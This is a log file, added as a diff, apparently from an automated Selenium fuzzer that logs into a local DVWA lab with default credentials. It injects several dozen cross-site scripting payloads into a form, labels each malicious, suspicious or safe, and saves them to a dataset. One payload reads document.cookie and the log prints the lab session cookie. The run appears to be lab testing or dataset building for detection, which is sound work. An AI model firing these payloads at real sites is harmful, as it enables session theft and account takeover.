@@ -1,0 +1,333 @@
+2025-05-16 15:46:03,037 - Loaded 43 payloads from wordlist.
+2025-05-16 15:46:03,039 - Dataset file initialized: fuzzer_dataset.csv
+2025-05-16 15:46:05,228 - Models reloaded successfully
+2025-05-16 15:46:05,236 - Started model file watcher
+2025-05-16 15:46:14,471 - Opened browser and navigating to http://localhost.
+2025-05-16 15:46:14,870 - Attempting to log in to DVWA.
+2025-05-16 15:46:18,206 - Entered login credentials: admin/password
+2025-05-16 15:46:21,422 - Successfully logged into DVWA.
+2025-05-16 15:46:21,422 - Monitoring input fields for 'exploit' keyword.
+2025-05-16 15:46:33,603 - Detected 'exploit' keyword in form field: exploit
+2025-05-16 15:46:33,680 - [02a5bb47-5581-43fa-9510-d9ab0497662c] Injected payload: "><script>alert(1)</script>
+2025-05-16 15:46:33,715 - [02a5bb47-5581-43fa-9510-d9ab0497662c] Form submitted with payload: "><script>alert(1)</script>
+2025-05-16 15:46:35,727 - Alert detected: 1
+2025-05-16 15:46:35,729 - Report written to report.log
+2025-05-16 15:46:36,016 - Data saved: malicious, "><script>alert(1)</script>, 200
+2025-05-16 15:46:36,018 - Report written to report.log
+2025-05-16 15:46:41,109 - [64a5cfa7-aaca-4149-9412-ab9c3e922db0] Injected payload: '><img src=x onerror=alert(1)>
+2025-05-16 15:46:41,174 - [64a5cfa7-aaca-4149-9412-ab9c3e922db0] Form submitted with payload: '><img src=x onerror=alert(1)>
+2025-05-16 15:46:43,188 - Alert detected: 1
+2025-05-16 15:46:43,189 - Report written to report.log
+2025-05-16 15:46:43,221 - Word count changed from 233 to 235.
+2025-05-16 15:46:43,223 - Report written to report.log
+2025-05-16 15:46:43,228 - Unexpected error detected in the page.
+2025-05-16 15:46:43,231 - Report written to report.log
+2025-05-16 15:46:43,342 - Data saved: malicious, '><img src=x onerror=alert(1)>, 200
+2025-05-16 15:46:43,343 - Report written to report.log
+2025-05-16 15:46:48,421 - [a569a2e6-1962-460d-9762-b1e5bbd333d9] Injected payload: javascript:alert(1)
+2025-05-16 15:46:48,456 - [a569a2e6-1962-460d-9762-b1e5bbd333d9] Form submitted with payload: javascript:alert(1)
+2025-05-16 15:46:50,469 - Word count changed from 235 to 233.
+2025-05-16 15:46:50,470 - Report written to report.log
+2025-05-16 15:46:50,579 - Data saved: suspicious, javascript:alert(1), 200
+2025-05-16 15:46:50,581 - Report written to report.log
+2025-05-16 15:46:55,665 - [0bb6fb37-b7db-4ced-afe1-75ccbb988d2b] Injected payload: " onmouseover=alert(1) x="
+2025-05-16 15:46:55,707 - [0bb6fb37-b7db-4ced-afe1-75ccbb988d2b] Form submitted with payload: " onmouseover=alert(1) x="
+2025-05-16 15:46:57,722 - Word count changed from 233 to 235.
+2025-05-16 15:46:57,724 - Report written to report.log
+2025-05-16 15:46:57,817 - Data saved: suspicious, " onmouseover=alert(1) x=", 200
+2025-05-16 15:46:57,819 - Report written to report.log
+2025-05-16 15:47:02,888 - [cf33f285-eaae-4976-8b84-6da174f1554f] Injected payload: ' onfocus=alert(1) autofocus '
+2025-05-16 15:47:02,920 - [cf33f285-eaae-4976-8b84-6da174f1554f] Form submitted with payload: ' onfocus=alert(1) autofocus '
+2025-05-16 15:47:04,930 - Word count changed from 235 to 236.
+2025-05-16 15:47:04,933 - Report written to report.log
+2025-05-16 15:47:05,029 - Data saved: suspicious, ' onfocus=alert(1) autofocus ', 200
+2025-05-16 15:47:05,031 - Report written to report.log
+2025-05-16 15:47:10,141 - [a5fd460e-a75f-4e93-8580-7ba8719cb386] Injected payload: <svg/onload=alert(1)>
+2025-05-16 15:47:10,171 - [a5fd460e-a75f-4e93-8580-7ba8719cb386] Form submitted with payload: <svg/onload=alert(1)>
+2025-05-16 15:47:12,185 - Alert detected: 1
+2025-05-16 15:47:12,186 - Report written to report.log
+2025-05-16 15:47:12,219 - Word count changed from 236 to 234.
+2025-05-16 15:47:12,219 - Report written to report.log
+2025-05-16 15:47:12,317 - Data saved: malicious, <svg/onload=alert(1)>, 200
+2025-05-16 15:47:12,318 - Report written to report.log
+2025-05-16 15:47:17,398 - [195069ff-a7bc-4cf6-8997-9903bea9e122] Injected payload: " autofocus onfocus=alert(1) x="
+2025-05-16 15:47:17,426 - [195069ff-a7bc-4cf6-8997-9903bea9e122] Form submitted with payload: " autofocus onfocus=alert(1) x="
+2025-05-16 15:47:19,445 - Word count changed from 234 to 236.
+2025-05-16 15:47:19,447 - Report written to report.log
+2025-05-16 15:47:19,541 - Data saved: suspicious, " autofocus onfocus=alert(1) x=", 200
+2025-05-16 15:47:19,542 - Report written to report.log
+2025-05-16 15:47:24,631 - [f029f404-9a04-47dc-b62d-4cfe691e3266] Injected payload: http://vulnerable.com/search?q=<script>alert(1)</script>
+2025-05-16 15:47:24,661 - [f029f404-9a04-47dc-b62d-4cfe691e3266] Form submitted with payload: http://vulnerable.com/search?q=<script>alert(1)</script>
+2025-05-16 15:47:26,678 - Alert detected: 1
+2025-05-16 15:47:26,678 - Report written to report.log
+2025-05-16 15:47:26,712 - Word count changed from 236 to 233.
+2025-05-16 15:47:26,713 - Report written to report.log
+2025-05-16 15:47:26,802 - Data saved: malicious, http://vulnerable.com/search?q=<script>alert(1)</script>, 200
+2025-05-16 15:47:26,802 - Report written to report.log
+2025-05-16 15:47:31,865 - [5a8ec9b9-4e4a-4535-8743-4ffdb770e823] Injected payload: " onload=alert(1) "
+2025-05-16 15:47:31,899 - [5a8ec9b9-4e4a-4535-8743-4ffdb770e823] Form submitted with payload: " onload=alert(1) "
+2025-05-16 15:47:33,910 - Word count changed from 233 to 235.
+2025-05-16 15:47:33,912 - Report written to report.log
+2025-05-16 15:47:34,004 - Data saved: suspicious, " onload=alert(1) ", 200
+2025-05-16 15:47:34,005 - Report written to report.log
+2025-05-16 15:47:39,080 - [09f7e8cb-5667-4346-8ec8-2766e0f4def1] Injected payload: '><iframe src=javascript:alert(1)>
+2025-05-16 15:47:39,109 - [09f7e8cb-5667-4346-8ec8-2766e0f4def1] Form submitted with payload: '><iframe src=javascript:alert(1)>
+2025-05-16 15:47:41,127 - Alert detected: 1
+2025-05-16 15:47:41,129 - Report written to report.log
+2025-05-16 15:47:41,160 - Word count changed from 235 to 239.
+2025-05-16 15:47:41,162 - Report written to report.log
+2025-05-16 15:47:41,259 - Data saved: malicious, '><iframe src=javascript:alert(1)>, 200
+2025-05-16 15:47:41,260 - Report written to report.log
+2025-05-16 15:47:46,312 - [c5410b1f-cd5c-4892-af4d-3b0da897e407] Injected payload: "><body onload=alert(1)>
+2025-05-16 15:47:46,346 - [c5410b1f-cd5c-4892-af4d-3b0da897e407] Form submitted with payload: "><body onload=alert(1)>
+2025-05-16 15:47:48,364 - Alert detected: 1
+2025-05-16 15:47:48,366 - Report written to report.log
+2025-05-16 15:47:48,412 - Word count changed from 239 to 234.
+2025-05-16 15:47:48,416 - Report written to report.log
+2025-05-16 15:47:48,515 - Data saved: malicious, "><body onload=alert(1)>, 200
+2025-05-16 15:47:48,517 - Report written to report.log
+2025-05-16 15:47:53,597 - [3609b065-d9ba-44f9-81ae-a2ddbc402c5f] Injected payload: %22%3E%3Cscript%3Ealert(1)%3C/script%3E (URL-encoded)
+2025-05-16 15:47:53,628 - [3609b065-d9ba-44f9-81ae-a2ddbc402c5f] Form submitted with payload: %22%3E%3Cscript%3Ealert(1)%3C/script%3E (URL-encoded)
+2025-05-16 15:47:55,720 - Data saved: safe, %22%3E%3Cscript%3Ealert(1)%3C/script%3E (URL-encoded), 200
+2025-05-16 15:47:55,721 - Report written to report.log
+2025-05-16 15:48:00,796 - [8d8cf33e-ce9b-4242-b62e-b3a6b6c3a727] Injected payload: '><audio src=x onerror=alert(1)>
+2025-05-16 15:48:00,845 - [8d8cf33e-ce9b-4242-b62e-b3a6b6c3a727] Form submitted with payload: '><audio src=x onerror=alert(1)>
+2025-05-16 15:48:02,860 - Alert detected: 1
+2025-05-16 15:48:02,862 - Report written to report.log
+2025-05-16 15:48:02,886 - Word count changed from 234 to 235.
+2025-05-16 15:48:02,889 - Report written to report.log
+2025-05-16 15:48:02,893 - Unexpected error detected in the page.
+2025-05-16 15:48:02,895 - Report written to report.log
+2025-05-16 15:48:02,974 - Data saved: malicious, '><audio src=x onerror=alert(1)>, 200
+2025-05-16 15:48:02,975 - Report written to report.log
+2025-05-16 15:48:08,049 - [94385687-6a44-4d12-b2ff-d34c86413ebc] Injected payload: "><video><source onerror=alert(1)>
+2025-05-16 15:48:08,083 - [94385687-6a44-4d12-b2ff-d34c86413ebc] Form submitted with payload: "><video><source onerror=alert(1)>
+2025-05-16 15:48:10,099 - Alert detected: 1
+2025-05-16 15:48:10,101 - Report written to report.log
+2025-05-16 15:48:10,142 - Word count changed from 235 to 234.
+2025-05-16 15:48:10,143 - Report written to report.log
+2025-05-16 15:48:10,152 - Unexpected error detected in the page.
+2025-05-16 15:48:10,157 - Report written to report.log
+2025-05-16 15:48:10,239 - Data saved: malicious, "><video><source onerror=alert(1)>, 200
+2025-05-16 15:48:10,240 - Report written to report.log
+2025-05-16 15:48:15,327 - [3514d763-01e8-446c-89df-c8b222b23bcf] Injected payload: '><details open ontoggle=alert(1)>
+2025-05-16 15:48:15,358 - [3514d763-01e8-446c-89df-c8b222b23bcf] Form submitted with payload: '><details open ontoggle=alert(1)>
+2025-05-16 15:48:17,384 - Alert detected: 1
+2025-05-16 15:48:17,386 - Report written to report.log
+2025-05-16 15:48:17,427 - Word count changed from 234 to 235.
+2025-05-16 15:48:17,429 - Report written to report.log
+2025-05-16 15:48:17,536 - Data saved: malicious, '><details open ontoggle=alert(1)>, 200
+2025-05-16 15:48:17,537 - Report written to report.log
+2025-05-16 15:48:22,616 - [a58760e2-3976-40c5-b444-970a96575946] Injected payload: "><marquee onstart=alert(1)>
+2025-05-16 15:48:22,654 - [a58760e2-3976-40c5-b444-970a96575946] Form submitted with payload: "><marquee onstart=alert(1)>
+2025-05-16 15:48:24,676 - Word count changed from 235 to 230.
+2025-05-16 15:48:24,678 - Report written to report.log
+2025-05-16 15:48:24,776 - Data saved: suspicious, "><marquee onstart=alert(1)>, 200
+2025-05-16 15:48:24,777 - Report written to report.log
+2025-05-16 15:48:29,866 - [98224c10-fe91-401b-9c8c-89bc08f69aa0] Injected payload: '><keygen autofocus onfocus=alert(1)>
+2025-05-16 15:48:29,895 - [98224c10-fe91-401b-9c8c-89bc08f69aa0] Form submitted with payload: '><keygen autofocus onfocus=alert(1)>
+2025-05-16 15:48:31,912 - Word count changed from 230 to 235.
+2025-05-16 15:48:31,914 - Report written to report.log
+2025-05-16 15:48:32,011 - Data saved: suspicious, '><keygen autofocus onfocus=alert(1)>, 200
+2025-05-16 15:48:32,013 - Report written to report.log
+2025-05-16 15:48:37,091 - [9d802f1e-cc9b-40f4-b1bf-3078164c1dc9] Injected payload: "><style onload=alert(1)>
+2025-05-16 15:48:37,126 - [9d802f1e-cc9b-40f4-b1bf-3078164c1dc9] Form submitted with payload: "><style onload=alert(1)>
+2025-05-16 15:48:39,148 - Alert detected: 1
+2025-05-16 15:48:39,150 - Report written to report.log
+2025-05-16 15:48:39,194 - Word count changed from 235 to 239.
+2025-05-16 15:48:39,195 - Report written to report.log
+2025-05-16 15:48:39,280 - Data saved: malicious, "><style onload=alert(1)>, 200
+2025-05-16 15:48:39,282 - Report written to report.log
+2025-05-16 15:48:44,345 - [0cd29e6e-5d74-410e-b85e-4b975910df3d] Injected payload: '><template onload=alert(1)>
+2025-05-16 15:48:44,374 - [0cd29e6e-5d74-410e-b85e-4b975910df3d] Form submitted with payload: '><template onload=alert(1)>
+2025-05-16 15:48:46,392 - Word count changed from 239 to 230.
+2025-05-16 15:48:46,393 - Report written to report.log
+2025-05-16 15:48:46,505 - Data saved: suspicious, '><template onload=alert(1)>, 200
+2025-05-16 15:48:46,507 - Report written to report.log
+2025-05-16 15:48:51,579 - [5acf0ab6-cba0-4929-909c-4b109b311254] Injected payload: "><embed src=javascript:alert(1)>
+2025-05-16 15:48:51,612 - [5acf0ab6-cba0-4929-909c-4b109b311254] Form submitted with payload: "><embed src=javascript:alert(1)>
+2025-05-16 15:48:53,622 - Alert detected: 1
+2025-05-16 15:48:53,629 - Report written to report.log
+2025-05-16 15:48:53,678 - Word count changed from 230 to 234.
+2025-05-16 15:48:53,684 - Report written to report.log
+2025-05-16 15:48:53,764 - Data saved: malicious, "><embed src=javascript:alert(1)>, 200
+2025-05-16 15:48:53,764 - Report written to report.log
+2025-05-16 15:48:58,829 - [c5887f8b-4e3b-4ec3-9dbc-380150c82cf3] Injected payload: <script>alert(document.cookie)</script>
+2025-05-16 15:48:58,861 - [c5887f8b-4e3b-4ec3-9dbc-380150c82cf3] Form submitted with payload: <script>alert(document.cookie)</script>
+2025-05-16 15:49:00,880 - Alert detected: PHPSESSID=t2ld8f02c0udt687jkivpcpum5; security=low
+2025-05-16 15:49:00,882 - Report written to report.log
+2025-05-16 15:49:00,926 - Word count changed from 234 to 233.
+2025-05-16 15:49:00,928 - Report written to report.log
+2025-05-16 15:49:01,020 - Data saved: malicious, <script>alert(document.cookie)</script>, 200
+2025-05-16 15:49:01,022 - Report written to report.log
+2025-05-16 15:49:06,101 - [87ea2a2d-9068-4416-ab7f-a0ce0d66a838] Injected payload: <img src=x onerror=alert(1)>
+2025-05-16 15:49:06,136 - [87ea2a2d-9068-4416-ab7f-a0ce0d66a838] Form submitted with payload: <img src=x onerror=alert(1)>
+2025-05-16 15:49:08,156 - Alert detected: 1
+2025-05-16 15:49:08,158 - Report written to report.log
+2025-05-16 15:49:08,192 - Word count changed from 233 to 235.
+2025-05-16 15:49:08,193 - Report written to report.log
+2025-05-16 15:49:08,208 - Unexpected error detected in the page.
+2025-05-16 15:49:08,210 - Report written to report.log
+2025-05-16 15:49:08,318 - Data saved: malicious, <img src=x onerror=alert(1)>, 200
+2025-05-16 15:49:08,319 - Report written to report.log
+2025-05-16 15:49:13,381 - [28bdf707-e850-4d81-9103-7e7f818ee332] Injected payload: <svg/onload=alert(1)>
+2025-05-16 15:49:13,417 - [28bdf707-e850-4d81-9103-7e7f818ee332] Form submitted with payload: <svg/onload=alert(1)>
+2025-05-16 15:49:15,427 - Alert detected: 1
+2025-05-16 15:49:15,428 - Report written to report.log
+2025-05-16 15:49:15,464 - Word count changed from 235 to 234.
+2025-05-16 15:49:15,468 - Report written to report.log
+2025-05-16 15:49:15,568 - Data saved: malicious, <svg/onload=alert(1)>, 200
+2025-05-16 15:49:15,571 - Report written to report.log
+2025-05-16 15:49:20,650 - [828ff05d-a796-4105-8dcd-0583eebbb1cd] Injected payload: <body onload=alert(1)>
+2025-05-16 15:49:20,688 - [828ff05d-a796-4105-8dcd-0583eebbb1cd] Form submitted with payload: <body onload=alert(1)>
+2025-05-16 15:49:22,701 - Alert detected: 1
+2025-05-16 15:49:22,701 - Report written to report.log
+2025-05-16 15:49:22,821 - Data saved: malicious, <body onload=alert(1)>, 200
+2025-05-16 15:49:22,821 - Report written to report.log
+2025-05-16 15:49:27,892 - [ebaf5182-cb48-41bf-8374-6a5b77163abf] Injected payload: <iframe src="javascript:alert(1)">
+2025-05-16 15:49:27,925 - [ebaf5182-cb48-41bf-8374-6a5b77163abf] Form submitted with payload: <iframe src="javascript:alert(1)">
+2025-05-16 15:49:29,941 - Alert detected: 1
+2025-05-16 15:49:29,943 - Report written to report.log
+2025-05-16 15:49:29,976 - Word count changed from 234 to 239.
+2025-05-16 15:49:29,977 - Report written to report.log
+2025-05-16 15:49:30,077 - Data saved: malicious, <iframe src="javascript:alert(1)">, 200
+2025-05-16 15:49:30,078 - Report written to report.log
+2025-05-16 15:49:35,154 - [a31f121e-9457-41c2-b3a7-cbef908f7e24] Injected payload: <a href="javascript:alert(1)">Click</a>
+2025-05-16 15:49:35,191 - [a31f121e-9457-41c2-b3a7-cbef908f7e24] Form submitted with payload: <a href="javascript:alert(1)">Click</a>
+2025-05-16 15:49:37,207 - Word count changed from 239 to 234.
+2025-05-16 15:49:37,208 - Report written to report.log
+2025-05-16 15:49:37,283 - Data saved: suspicious, <a href="javascript:alert(1)">Click</a>, 200
+2025-05-16 15:49:37,284 - Report written to report.log
+2025-05-16 15:49:42,361 - [2c21160b-9fb9-487c-9325-08ea2ab4d04e] Injected payload: <div onmouseover=alert(1)>Hover</div>
+2025-05-16 15:49:42,399 - [2c21160b-9fb9-487c-9325-08ea2ab4d04e] Form submitted with payload: <div onmouseover=alert(1)>Hover</div>
+2025-05-16 15:49:44,508 - Data saved: safe, <div onmouseover=alert(1)>Hover</div>, 200
+2025-05-16 15:49:44,509 - Report written to report.log
+2025-05-16 15:49:49,573 - [9cdc8a30-1a14-43b5-a228-47b0112298c7] Injected payload: <input type="text" onfocus=alert(1) autofocus>
+2025-05-16 15:49:49,605 - [9cdc8a30-1a14-43b5-a228-47b0112298c7] Form submitted with payload: <input type="text" onfocus=alert(1) autofocus>
+2025-05-16 15:49:51,620 - Alert detected: 1
+2025-05-16 15:49:51,621 - Report written to report.log
+2025-05-16 15:49:51,666 - Word count changed from 234 to 236.
+2025-05-16 15:49:51,669 - Report written to report.log
+2025-05-16 15:49:51,763 - Data saved: malicious, <input type="text" onfocus=alert(1) autofocus>, 200
+2025-05-16 15:49:51,765 - Report written to report.log
+2025-05-16 15:49:56,842 - [dd351aac-9738-49ed-95e6-4e1aabb730bb] Injected payload: <video><source onerror=alert(1)>
+2025-05-16 15:49:56,874 - [dd351aac-9738-49ed-95e6-4e1aabb730bb] Form submitted with payload: <video><source onerror=alert(1)>
+2025-05-16 15:49:58,897 - Alert detected: 1
+2025-05-16 15:49:58,899 - Report written to report.log
+2025-05-16 15:49:58,945 - Word count changed from 236 to 234.
+2025-05-16 15:49:58,947 - Report written to report.log
+2025-05-16 15:49:58,955 - Unexpected error detected in the page.
+2025-05-16 15:49:58,957 - Report written to report.log
+2025-05-16 15:49:59,032 - Data saved: malicious, <video><source onerror=alert(1)>, 200
+2025-05-16 15:49:59,033 - Report written to report.log
+2025-05-16 15:50:04,115 - [adc8c02a-0fc9-4af9-9c88-8e749695e75d] Injected payload: <marquee onstart=alert(1)>
+2025-05-16 15:50:04,152 - [adc8c02a-0fc9-4af9-9c88-8e749695e75d] Form submitted with payload: <marquee onstart=alert(1)>
+2025-05-16 15:50:06,177 - Word count changed from 234 to 230.
+2025-05-16 15:50:06,178 - Report written to report.log
+2025-05-16 15:50:06,268 - Data saved: suspicious, <marquee onstart=alert(1)>, 200
+2025-05-16 15:50:06,269 - Report written to report.log
+2025-05-16 15:50:11,367 - [925d91db-432f-45c6-8a1f-a420ea2d358e] Injected payload: <details open ontoggle=alert(1)>
+2025-05-16 15:50:11,412 - [925d91db-432f-45c6-8a1f-a420ea2d358e] Form submitted with payload: <details open ontoggle=alert(1)>
+2025-05-16 15:50:13,421 - Alert detected: 1
+2025-05-16 15:50:13,424 - Report written to report.log
+2025-05-16 15:50:13,469 - Word count changed from 230 to 235.
+2025-05-16 15:50:13,472 - Report written to report.log
+2025-05-16 15:50:13,570 - Data saved: malicious, <details open ontoggle=alert(1)>, 200
+2025-05-16 15:50:13,570 - Report written to report.log
+2025-05-16 15:50:18,637 - [367f4d23-024e-41b0-bedb-a73959f0b962] Injected payload: <script>alert(1)</script>
+2025-05-16 15:50:18,677 - [367f4d23-024e-41b0-bedb-a73959f0b962] Form submitted with payload: <script>alert(1)</script>
+2025-05-16 15:50:20,693 - Alert detected: 1
+2025-05-16 15:50:20,694 - Report written to report.log
+2025-05-16 15:50:20,828 - Word count changed from 235 to 233.
+2025-05-16 15:50:20,831 - Report written to report.log
+2025-05-16 15:50:20,937 - Data saved: malicious, <script>alert(1)</script>, 200
+2025-05-16 15:50:20,938 - Report written to report.log
+2025-05-16 15:50:26,007 - [562637d0-985a-44a8-b17c-4b535019a14f] Injected payload: <audio src=x onerror=alert(1)>
+2025-05-16 15:50:26,038 - [562637d0-985a-44a8-b17c-4b535019a14f] Form submitted with payload: <audio src=x onerror=alert(1)>
+2025-05-16 15:50:28,053 - Alert detected: 1
+2025-05-16 15:50:28,059 - Report written to report.log
+2025-05-16 15:50:28,093 - Word count changed from 233 to 235.
+2025-05-16 15:50:28,093 - Report written to report.log
+2025-05-16 15:50:28,104 - Unexpected error detected in the page.
+2025-05-16 15:50:28,105 - Report written to report.log
+2025-05-16 15:50:28,186 - Data saved: malicious, <audio src=x onerror=alert(1)>, 200
+2025-05-16 15:50:28,192 - Report written to report.log
+2025-05-16 15:50:33,261 - [93c8895f-605f-41de-a30b-559f43667b25] Injected payload: <form onsubmit=alert(1)><input type=submit>
+2025-05-16 15:50:33,291 - [93c8895f-605f-41de-a30b-559f43667b25] Form submitted with payload: <form onsubmit=alert(1)><input type=submit>
+2025-05-16 15:50:35,376 - Data saved: safe, <form onsubmit=alert(1)><input type=submit>, 200
+2025-05-16 15:50:35,376 - Report written to report.log
+2025-05-16 15:50:40,458 - [953dfc38-e9ff-479c-8e57-dd581f014f1d] Injected payload: <keygen autofocus onfocus=alert(1)>
+2025-05-16 15:50:40,490 - [953dfc38-e9ff-479c-8e57-dd581f014f1d] Form submitted with payload: <keygen autofocus onfocus=alert(1)>
+2025-05-16 15:50:42,578 - Data saved: safe, <keygen autofocus onfocus=alert(1)>, 200
+2025-05-16 15:50:42,580 - Report written to report.log
+2025-05-16 15:50:47,593 - [953dfc38-e9ff-479c-8e57-dd581f014f1d] Error during fuzzing: Message: The element with the reference de49ec25-fb0f-4f94-bbd9-224da1f8cbc0 is stale; either its node document is not the active document, or it is no longer connected to the DOM; For documentation on this error, please visit: https://www.selenium.dev/documentation/webdriver/troubleshooting/errors#stale-element-reference-exception
+Stacktrace:
+RemoteError@chrome://remote/content/shared/RemoteError.sys.mjs:8:8
+WebDriverError@chrome://remote/content/shared/webdriver/Errors.sys.mjs:199:5
+StaleElementReferenceError@chrome://remote/content/shared/webdriver/Errors.sys.mjs:796:5
+getKnownElement@chrome://remote/content/marionette/json.sys.mjs:405:11
+deserializeJSON@chrome://remote/content/marionette/json.sys.mjs:263:20
+cloneObject@chrome://remote/content/marionette/json.sys.mjs:59:24
+deserializeJSON@chrome://remote/content/marionette/json.sys.mjs:293:16
+cloneObject@chrome://remote/content/marionette/json.sys.mjs:59:24
+deserializeJSON@chrome://remote/content/marionette/json.sys.mjs:293:16
+json.deserialize@chrome://remote/content/marionette/json.sys.mjs:297:10
+receiveMessage@chrome://remote/content/marionette/actors/MarionetteCommandsChild.sys.mjs:202:30
+
+2025-05-16 15:50:47,669 - [679eb18e-7da2-48f6-b082-6ba205d548b6] Injected payload: <select onchange=alert(1)><option>1<option>2</select>
+2025-05-16 15:50:47,700 - [679eb18e-7da2-48f6-b082-6ba205d548b6] Form submitted with payload: <select onchange=alert(1)><option>1<option>2</select>
+2025-05-16 15:50:49,721 - Word count changed from 235 to 234.
+2025-05-16 15:50:49,721 - Report written to report.log
+2025-05-16 15:50:49,797 - Data saved: suspicious, <select onchange=alert(1)><option>1<option>2</select>, 200
+2025-05-16 15:50:49,803 - Report written to report.log
+2025-05-16 15:50:54,874 - [3d0e62cb-89c4-4a3f-b88a-2ae3249f64b9] Injected payload: <style onload=alert(1)>
+2025-05-16 15:50:54,906 - [3d0e62cb-89c4-4a3f-b88a-2ae3249f64b9] Form submitted with payload: <style onload=alert(1)>
+2025-05-16 15:50:56,918 - Alert detected: 1
+2025-05-16 15:50:56,919 - Report written to report.log
+2025-05-16 15:50:56,944 - Word count changed from 234 to 239.
+2025-05-16 15:50:56,946 - Report written to report.log
+2025-05-16 15:50:57,032 - Data saved: malicious, <style onload=alert(1)>, 200
+2025-05-16 15:50:57,034 - Report written to report.log
+2025-05-16 15:51:02,098 - [37f53e0a-4608-4864-9e8e-b7d759c35941] Injected payload: <script>alert(0)</script>
+2025-05-16 15:51:02,126 - [37f53e0a-4608-4864-9e8e-b7d759c35941] Form submitted with payload: <script>alert(0)</script>
+2025-05-16 15:51:04,138 - Alert detected: 0
+2025-05-16 15:51:04,139 - Report written to report.log
+2025-05-16 15:51:04,190 - Word count changed from 239 to 233.
+2025-05-16 15:51:04,192 - Report written to report.log
+2025-05-16 15:51:04,272 - Data saved: malicious, <script>alert(0)</script>, 200
+2025-05-16 15:51:04,275 - Report written to report.log
+2025-05-16 15:51:09,376 - [ae6b4f57-5385-4759-8585-a20d06bb2012] Injected payload: <object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
+2025-05-16 15:51:09,407 - [ae6b4f57-5385-4759-8585-a20d06bb2012] Form submitted with payload: <object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
+2025-05-16 15:51:11,424 - Alert detected: 1
+2025-05-16 15:51:11,427 - Report written to report.log
+2025-05-16 15:51:11,463 - Word count changed from 233 to 230.
+2025-05-16 15:51:11,465 - Report written to report.log
+2025-05-16 15:51:11,559 - Models reloaded successfully
+2025-05-16 15:51:11,603 - Data saved: malicious, <object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>, 200
+2025-05-16 15:51:11,604 - Report written to report.log
+2025-05-16 15:51:16,660 - [e6439003-7f0f-4d30-b2e5-dd9befc03486] Injected payload: <embed src=javascript:alert(1)>
+2025-05-16 15:51:16,690 - [e6439003-7f0f-4d30-b2e5-dd9befc03486] Form submitted with payload: <embed src=javascript:alert(1)>
+2025-05-16 15:51:18,707 - Alert detected: 1
+2025-05-16 15:51:18,708 - Report written to report.log
+2025-05-16 15:51:18,752 - Word count changed from 230 to 234.
+2025-05-16 15:51:18,754 - Report written to report.log
+2025-05-16 15:51:18,820 - Data saved: malicious, <embed src=javascript:alert(1)>, 200
+2025-05-16 15:51:18,821 - Report written to report.log
+2025-05-16 15:51:23,902 - [d4c5675f-b1b0-47a9-bc44-2dde26127ab4] Injected payload: <base href="javascript:alert(1)//">
+2025-05-16 15:51:23,929 - [d4c5675f-b1b0-47a9-bc44-2dde26127ab4] Form submitted with payload: <base href="javascript:alert(1)//">
+2025-05-16 15:51:26,020 - Data saved: safe, <base href="javascript:alert(1)//">, 200
+2025-05-16 15:51:26,021 - Report written to report.log
+2025-05-16 15:51:31,086 - [ae1d136c-6c46-4db3-b5b6-655c8b7bb961] Injected payload: <template onload=alert(1)>
+2025-05-16 15:51:31,133 - [ae1d136c-6c46-4db3-b5b6-655c8b7bb961] Form submitted with payload: <template onload=alert(1)>
+2025-05-16 15:51:33,156 - Word count changed from 234 to 230.
+2025-05-16 15:51:33,158 - Report written to report.log
+2025-05-16 15:51:33,237 - Data saved: suspicious, <template onload=alert(1)>, 200
+2025-05-16 15:51:33,238 - Report written to report.log
+2025-05-16 15:51:38,307 - [d48c8d67-a822-4231-983f-02c750fe9ea5] Injected payload: <script>alert(xss)</script>
+2025-05-16 15:51:38,340 - [d48c8d67-a822-4231-983f-02c750fe9ea5] Form submitted with payload: <script>alert(xss)</script>
+2025-05-16 15:51:40,360 - Word count changed from 230 to 233.
+2025-05-16 15:51:40,361 - Report written to report.log
+2025-05-16 15:51:40,449 - Data saved: suspicious, <script>alert(xss)</script>, 200
+2025-05-16 15:51:40,451 - Report written to report.log
+2025-05-16 15:51:45,456 - Stopped model file watcher
+2025-05-16 15:51:48,415 - Fuzzing process completed.
